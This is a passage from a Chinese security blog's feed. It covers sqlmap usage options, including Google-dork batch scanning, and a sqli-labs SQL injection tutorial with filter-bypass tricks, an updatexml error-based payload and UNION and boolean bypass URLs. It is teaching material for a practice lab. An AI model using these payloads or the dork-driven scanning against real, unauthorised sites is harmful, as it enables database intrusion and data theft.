src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/Misc-A_Beautiful_Picture-DreamerJack.png"><br>查看图片分辨率为1000 $\times$ 900,修改图片高度为1000<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f8.png">    </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap详解</title>
      <link href="/2020/03/17/sqlmap/"/>
      <url>/2020/03/17/sqlmap/</url>
      
        <content type="html"><![CDATA[<p>sqlmap使用详解</p><h2 id="获取目标系统信息-–banner"><a href="#获取目标系统信息-–banner" class="headerlink" title="获取目标系统信息 –banner"></a>获取目标系统信息 –banner</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/sqli/less-1/?id=1"</span> --batch --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="对多个目标进行探测"><a href="#对多个目标进行探测" class="headerlink" title="对多个目标进行探测"></a>对多个目标进行探测</h2><ul><li>Sqlmap支持从不同类型的文件中读取目标进行Sql注入探测</li></ul><ol><li><p>-l 从Burpsuite proxy或WebScarab proxy中读取Http请求日志文件</p><blockquote><h3 id="设置日志过滤目标"><a href="#设置日志过滤目标" class="headerlink" title="设置日志过滤目标"></a>设置日志过滤目标</h3><p>与使用选项-l使用从提供的日志解析的所有主机不同，您可以指定有效的Python正则表达式，用于过滤所需的日志</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -l burp.log --scope<span class="token operator">=</span><span class="token string">"(www)?\.target\.(com|net|org)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–skip-urlencode 不进行URL编码</p></li><li><p>-x 从sitemap.xml站点地图文件中读取目标探测。  </p></li><li><p>-m 从多行文本格式文件读取多个目标，对多个目标进行探测。  </p></li><li><p>-r 从文本文件中读取Http请求作为Sql注入探测的目标。  </p></li><li><p>-c 从配置文件sqlmap.conf中读取目标探测。</p></li></ol><h3 id="burpsuite保存日志文件"><a href="#burpsuite保存日志文件" class="headerlink" title="burpsuite保存日志文件"></a>burpsuite保存日志文件</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f1.png"></p><p>将日志文件复制到sqlmap文件目录下</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f2.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -l <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在探测完一个目标后，会继续询问是否探测文件中的下一个目标</p><h3 id="m，对txt文件探测"><a href="#m，对txt文件探测" class="headerlink" title="-m，对txt文件探测"></a>-m，对txt文件探测</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f3.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -m <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="通过谷歌批量探测"><a href="#通过谷歌批量探测" class="headerlink" title="通过谷歌批量探测"></a>通过谷歌批量探测</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -g <span class="token string">"inurl:.php?id="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="设置请求参数"><a href="#设置请求参数" class="headerlink" title="设置请求参数"></a>设置请求参数</h2><h3 id="设置HTTP请求方法"><a href="#设置HTTP请求方法" class="headerlink" title="设置HTTP请求方法"></a>设置HTTP请求方法</h3><p>sqlmap会自动在探测过程中使用适合的HTTP请求方法，但是在某些具体情况下，需要强制使用具体的请求方法，如PUT请求方法，因为PUT不会自动使用</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--method<span class="token operator">=</span>PUT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置POST提交参数"><a href="#设置POST提交参数" class="headerlink" title="设置POST提交参数"></a>设置POST提交参数</h3><p>默认情况下，HTTP请求的方法是GET，但是可以在提供POST请求中发送的数据隐式地将其更改为POST</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://192.168.0.100/sqli/Less-11/"</span> --data <span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span> -f --banner --dbs --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里-f是指 fingerprint 指纹信息</p></blockquote><h3 id="设置参数分隔符"><a href="#设置参数分隔符" class="headerlink" title="设置参数分隔符"></a>设置参数分隔符</h3><p>有时候需要覆盖默认的参数分隔符，才能正确地分隔和和单独处理每个参数</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://192.168.0.100/sqli/Less-11/"</span> --data <span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span> --param-del<span class="token operator">=</span><span class="token string">"&amp;"</span> -f --banner --dbs --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置Cookie头"><a href="#设置Cookie头" class="headerlink" title="设置Cookie头"></a>设置Cookie头</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --cookie <span class="token string">"security=low; PHPSESSID=lajsoguwekl021"</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。  </li><li>反之亦然，如果提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set-Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。  </li><li>load-cookie，可以用来提供包含Netscape/wget格式的cookie的特殊文件  <blockquote><p>注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）</p></blockquote></li></ul><h3 id="设置user-agent"><a href="#设置user-agent" class="headerlink" title="设置user-agent"></a>设置user-agent</h3><h4 id="指定user-agent"><a href="#指定user-agent" class="headerlink" title="指定user-agent"></a>指定user-agent</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --user-agent<span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="也可以随机筛选"><a href="#也可以随机筛选" class="headerlink" title="也可以随机筛选"></a>也可以随机筛选</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --random-agent --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>针对user-agent注入的值，要设置–level为3</p></blockquote><h3 id="设置Host头"><a href="#设置Host头" class="headerlink" title="设置Host头"></a>设置Host头</h3><p>可以手动设置HTTP主机头的值，可在host最后加一个*，表示对host探测是否存在注入</p><blockquote><p>若 –level 设置为5，将对HTTP主机头进行SQL注入检测 </p></blockquote><h3 id="设置Referer"><a href="#设置Referer" class="headerlink" title="设置Referer"></a>设置Referer</h3><p>默认情况下，不会发送HTTP引用头</p><blockquote><p>若 –level 设置为3或以上，将针对HTTP引用头进行SQL注入测试</p></blockquote><h3 id="设置额外HTTP头"><a href="#设置额外HTTP头" class="headerlink" title="设置额外HTTP头"></a>设置额外HTTP头</h3><p>设置选项–header，可以提供额外的HTTP标头，每个标头必须用换行符\n分隔  </p><p>从配置文件sqlmap.conf中提供它们会更容易</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --headers<span class="token operator">=</span><span class="token string">"Host:www.target.com<span class="token entity" title="\n">\n</span>User-agent:Firefox 1.0"</span> -v <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>设置单个用 -H, 多个用 –headers</p></blockquote><h3 id="设置HTTP协议认证"><a href="#设置HTTP协议认证" class="headerlink" title="设置HTTP协议认证"></a>设置HTTP协议认证</h3><p>Sqlmap中设置HTTP协议认证的参数：–auth-type和–auth-cred, 其中–auth-type支持 Basic、Digest、NTLM<br>–auth-cred认证语法为：username:password</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://url/arit.php?id=1"</span> --auth-type Basic --auth-cred <span class="token string">"testuser:testpass"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置HTTP代理"><a href="#设置HTTP代理" class="headerlink" title="设置HTTP代理"></a>设置HTTP代理</h3><ul><li>Sqlmap中设置代理的参数：–proxy, –proxy-cred, –proxy-file, –ignore-proxy  </li><li>其中–proxy用来设置HTTP代理服务器位置 格式：–proxy http(s)://ip[:端口]  </li><li>–proxy-cred用来设置HTTP代理服务器认证信息 格式：–proxy-cred username:password  </li><li>–proxy-file用来设置多条代理在文件中  </li><li>–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时，应该使用这种方法。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f4.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://url/arit.php?id=1"</span> --proxy <span class="token string">"http://122.5.190.206:9999"</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置延迟"><a href="#设置延迟" class="headerlink" title="设置延迟"></a>设置延迟</h3><p>–delay 0.5 延迟0.5秒</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://url/arit.php?id=1"</span> --delay <span class="token number">0.5</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h3><p>指定等待响应的秒数，默认为30秒</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--timeout <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置重试次数"><a href="#设置重试次数" class="headerlink" title="设置重试次数"></a>设置重试次数</h3><p>默认重试3次<br>通常结合timeout参数使用</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--retries <span class="token number">4</span> --timeout <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略401"><a href="#忽略401" class="headerlink" title="忽略401"></a>忽略401</h3><p>忽略返回HTTP错误401(未经授权的)的站点</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--ignore-401<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置HTTP协议私钥"><a href="#设置HTTP协议私钥" class="headerlink" title="设置HTTP协议私钥"></a>设置HTTP协议私钥</h3><p>当web服务器需要适当的客户端证书和用于身份验证的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--auth-file 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><p>有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--safe-url, --safe-post, --safe-req  --safe-freq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="sqlmap性能优化"><a href="#sqlmap性能优化" class="headerlink" title="sqlmap性能优化"></a>sqlmap性能优化</h2><h3 id="设置持久HTTP连接，在一定程度上避免服务器受到探测影响"><a href="#设置持久HTTP连接，在一定程度上避免服务器受到探测影响" class="headerlink" title="设置持久HTTP连接，在一定程度上避免服务器受到探测影响"></a>设置持久HTTP连接，在一定程度上避免服务器受到探测影响</h3><p>设置连接为持久连接，即在HTTP报文中设置Connection: Keep-Alive</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不接收HTTP-Body"><a href="#不接收HTTP-Body" class="headerlink" title="不接收HTTP Body"></a>不接收HTTP Body</h3><p>设置空连接，表示不接受HTTP中的Body，常用于盲注</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--null-connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置多线程"><a href="#设置多线程" class="headerlink" title="设置多线程"></a>设置多线程</h3><p>默认3个多线程，最大为10</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--thread <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意探测过快会影响服务器性能</p></blockquote><h3 id="设置预测输出"><a href="#设置预测输出" class="headerlink" title="设置预测输出"></a>设置预测输出</h3><p>在推理算法中用于检索值字符的顺序统计预测</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--predict-output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意与–thread不兼容</p></blockquote><h3 id="一键优化"><a href="#一键优化" class="headerlink" title="一键优化"></a>一键优化</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加此参数相当于同时添加下列三个优化参数：</p><ul><li>–keep-alive  </li><li>–null-connection  </li><li>–threads=3 （如果没有设置一个更好的值）</li></ul><hr><h2 id="指定位置注入"><a href="#指定位置注入" class="headerlink" title="指定位置注入"></a>指定位置注入</h2><h3 id="指定具体探测的参数"><a href="#指定具体探测的参数" class="headerlink" title="指定具体探测的参数"></a>指定具体探测的参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-p <span class="token string">"id,user-agent"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略探测具体的参数"><a href="#忽略探测具体的参数" class="headerlink" title="忽略探测具体的参数"></a>忽略探测具体的参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--skip <span class="token string">"user-agent,referer"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略包含具体内容的参数"><a href="#忽略包含具体内容的参数" class="headerlink" title="忽略包含具体内容的参数"></a>忽略包含具体内容的参数</h3><p>如不对包含token或session的参数进行探测</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--param-exclude<span class="token operator">=</span><span class="token string">"token|session"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略静态参数"><a href="#忽略静态参数" class="headerlink" title="忽略静态参数"></a>忽略静态参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--skip-static<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置URL注入位置"><a href="#设置URL注入位置" class="headerlink" title="设置URL注入位置"></a>设置URL注入位置</h3><p>当注入点位于URL本身内部时，要手动指向URL路径，否则sqlmap不会对URL路径执行任何自动测试，必须在命令行中添加星号(*)来指定这些注入点<br>当使用Apache web服务器的mod_rewrite模块或其他类似的技术时，这就显得特别有用了</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://targeturl/param1/value1*/param2/value2/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号-即可"><a href="#不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号-即可" class="headerlink" title="不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号(*)即可"></a>不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号(*)即可</h3><hr><h2 id="注入参数"><a href="#注入参数" class="headerlink" title="注入参数"></a>注入参数</h2><h3 id="强制设置DBMS-数据库管理系统"><a href="#强制设置DBMS-数据库管理系统" class="headerlink" title="强制设置DBMS(数据库管理系统)"></a>强制设置DBMS(数据库管理系统)</h3><p>默认会自动识别DBMS，以下是sqlmap完全支持的DBMS种类</p><blockquote><p>Mysql、Oracle、Microsoft SQL Server、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB、Informix</p></blockquote><p>强制指定，可以避免再探测是否是其他的数据库，可以加快探测速度</p><p>–dbms 数据库管理系统名称 [版本号]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--dbms microsoft sql server 05<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="强制设置OS系统"><a href="#强制设置OS系统" class="headerlink" title="强制设置OS系统"></a>强制设置OS系统</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--os windows--os linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它<br>如果不知道它，让sqlmap自动为您识别</p></blockquote><h3 id="关闭负载转换机制"><a href="#关闭负载转换机制" class="headerlink" title="关闭负载转换机制"></a>关闭负载转换机制</h3><p>在检索结果时，sqlmap使用一种机制，在这种机制中，所有条目都被转换为字符串类型，并在NULL值的情况下用空格字符替换。这样做是为了防止出现任何错误状态(例如，将空值与字符串值连接起来)，并简化数据检索过程本身。尽管如此，还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例<br>如没有返回值)需要关闭这种机制(使用此开关)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--no-cast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关闭字符转义机制"><a href="#关闭字符转义机制" class="headerlink" title="关闭字符转义机制"></a>关闭字符转义机制</h3><p>在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如，选择’foobar’)时，这些值将自动转义(例如，选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)) </p><p>这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes<br>和/或mysql_real_escape_string)的潜在问题。用户可以使用这个开关关闭它(可以减少有效负载大小)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--no-escape<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="强制设置无效值替换"><a href="#强制设置无效值替换" class="headerlink" title="强制设置无效值替换"></a>强制设置无效值替换</h3><p>sqlmap在需要使原始参数值无效时，一般会使用经典否定(如id=-1)，使用参数可强制替换为别的否定</p><p>如使用大整数值，如id=99999999</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--invalid-bignum<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用布尔操作(如id=1 and 1=2)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--invalid-logical<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用随机字符串(如id=abc)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--invalid-string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于sqli_lab的sql注入详解(二)</title>
      <link href="/2020/03/16/mysql-injection-2/"/>
      <url>/2020/03/16/mysql-injection-2/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><blockquote><p>程序中设置了过滤关键字，但没有对关键字组成深入分析过滤，可以通过修改关键字内字母大小写来绕过过滤措施。<br>如：AnD 1=1 （将某些字母大写）</p></blockquote><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><blockquote><p>在程序中设置出现关键字之后替换为空，可以双写绕过<br>uniunionOn(也可结合大小写绕过使用)</p></blockquote><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><blockquote><p>利用URL编码绕过过滤机制</p></blockquote><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/*!select * from admin*/</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="POST基于时间的盲注"><a href="#POST基于时间的盲注" class="headerlink" title="POST基于时间的盲注"></a>POST基于时间的盲注</h2><h3 id="以less-15为例"><a href="#以less-15为例" class="headerlink" title="以less-15为例"></a>以less-15为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f2.png"></p><h3 id="输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"><a href="#输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果" class="headerlink" title="输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"></a>输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f1.png"></p><hr><h2 id="POST基于布尔的盲注"><a href="#POST基于布尔的盲注" class="headerlink" title="POST基于布尔的盲注"></a>POST基于布尔的盲注</h2><h3 id="还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg"><a href="#还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg" class="headerlink" title="还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg"></a>还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f3.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f4.png"></p><hr><h2 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote><p>看一下源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f5.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f6.png"><br>未对HTTP头的变量过滤，导致注入漏洞产生<br>可以在参数最后加入\，测试漏洞是否存在</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f9.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f10.png"> </p><h3 id="利用一个报错函数updatexml构造payload"><a href="#利用一个报错函数updatexml构造payload" class="headerlink" title="利用一个报错函数updatexml构造payload"></a>利用一个报错函数updatexml构造payload</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http">' and updatexml(1,concat(0x3a,(select version()),0x3a),1) or '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f7.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f8.png">   </p><hr><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><h3 id="以less-20为例，首先抓到HTTP包，然后进行重定向"><a href="#以less-20为例，首先抓到HTTP包，然后进行重定向" class="headerlink" title="以less-20为例，首先抓到HTTP包，然后进行重定向"></a>以less-20为例，首先抓到HTTP包，然后进行重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f11.png">  </p><h3 id="然后将包forward，抓到含有cookie注入漏洞的包"><a href="#然后将包forward，抓到含有cookie注入漏洞的包" class="headerlink" title="然后将包forward，抓到含有cookie注入漏洞的包"></a>然后将包forward，抓到含有cookie注入漏洞的包</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f12.png">   </p><h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f13.png"></p><hr><h2 id="绕过去除注释符的sql注入"><a href="#绕过去除注释符的sql注入" class="headerlink" title="绕过去除注释符的sql注入"></a>绕过去除注释符的sql注入</h2><h3 id="以less-23为例，可以看到对id参数进行了去除注释符的过滤"><a href="#以less-23为例，可以看到对id参数进行了去除注释符的过滤" class="headerlink" title="以less-23为例，可以看到对id参数进行了去除注释符的过滤"></a>以less-23为例，可以看到对id参数进行了去除注释符的过滤</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f14.png">  </p><h3 id="可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果"><a href="#可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果" class="headerlink" title="可以通过or ‘1’=’1  的方式去闭合右边的引号部分，从而达到绕过效果"></a>可以通过or ‘1’=’1  的方式去闭合右边的引号部分，从而达到绕过效果</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-23/?id=-1' union select 1,database(),'3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f15.png">  </p><hr><h2 id="绕过过滤and和or的注入"><a href="#绕过过滤and和or的注入" class="headerlink" title="绕过过滤and和or的注入"></a>绕过过滤and和or的注入</h2><h3 id="对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red"><a href="#对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red" class="headerlink" title="对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$"></a>对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$</h3><h3 id="以less-25为例"><a href="#以less-25为例" class="headerlink" title="以less-25为例"></a>以less-25为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f16.png">   </p><h3 id="改变大小写发现无效"><a href="#改变大小写发现无效" class="headerlink" title="改变大小写发现无效"></a>改变大小写发现无效</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-25/?id=1'  And 1=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f17.png"></p><h3 id="双写绕过和-都可以"><a href="#双写绕过和-都可以" class="headerlink" title="双写绕过和||都可以"></a>双写绕过和||都可以</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-25/?id=1'  || 1=1--+<span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-25/?id=1'  anandd 1=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f18.png"></p><hr><h2 id="绕过去除空格的注入"><a href="#绕过去除空格的注入" class="headerlink" title="绕过去除空格的注入"></a>绕过去除空格的注入</h2><h3 id="以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等"><a href="#以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等" class="headerlink" title="以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等"></a>以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f19.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-26/?id=1'%20||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 